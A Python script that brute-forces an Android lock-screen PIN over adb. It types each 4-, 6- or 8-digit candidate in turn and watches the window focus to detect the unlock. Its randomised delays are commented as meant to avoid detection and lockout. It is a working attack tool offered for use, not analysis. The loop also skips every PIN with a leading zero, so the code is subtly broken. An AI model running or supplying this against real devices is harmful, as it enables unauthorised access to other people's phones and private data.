import os
import time
import random
import argparse

def is_termux():
    return os.path.exists('/data/data/com.termux/')

def send_pin(pin):
    command = f"adb shell input text {pin}"
    os.system(command)
    os.system("adb shell input keyevent 66")  # Press Enter
    time.sleep(random.uniform(1.2, 3.0))  # Randomized delay to avoid detection

def brute_force(pin_length):
    start = 10**(pin_length - 1)  # Smallest number for given length
    end = 10**pin_length  # Largest number +1 for given length
    
    for pin in range(start, end):
        pin_str = str(pin).zfill(pin_length)
        print(f"Trying PIN: {pin_str}")
        send_pin(pin_str)
        
        # Check if the phone is unlocked (modify as needed for detection)
        unlock_check = os.popen("adb shell dumpsys window | grep mCurrentFocus").read()
        if "HomeActivity" in unlock_check or "Launcher" in unlock_check:
            print(f"[+] PIN Found: {pin_str}")
            with open("found_password.txt", "w") as f:
                f.write(f"Correct PIN: {pin_str}\n")
            return pin_str
        
        # Introduce a longer wait every 10 attempts to prevent lockout
        if pin % 10 == 0:
            wait_time = random.uniform(5, 10)
            print(f"[!] Taking a break for {wait_time:.2f} seconds to avoid detection...")
            time.sleep(wait_time)

    print("[-] PIN not found in range.")
    return None

# Check if running on Termux or PC and set ADB accordingly
if is_termux():
    os.system("pkg install android-tools -y")  # Ensure ADB is installed in Termux
else:
    print("Ensure ADB is installed on your PC and added to PATH.")

# Argument parser for choosing PIN length
parser = argparse.ArgumentParser(description="Android PIN Brute Force using ADB")
parser.add_argument("-l", "--length", type=int, choices=[4, 6, 8], required=True, help="Choose PIN length: 4, 6, or 8 digits")
args = parser.parse_args()

brute_force(args.length)
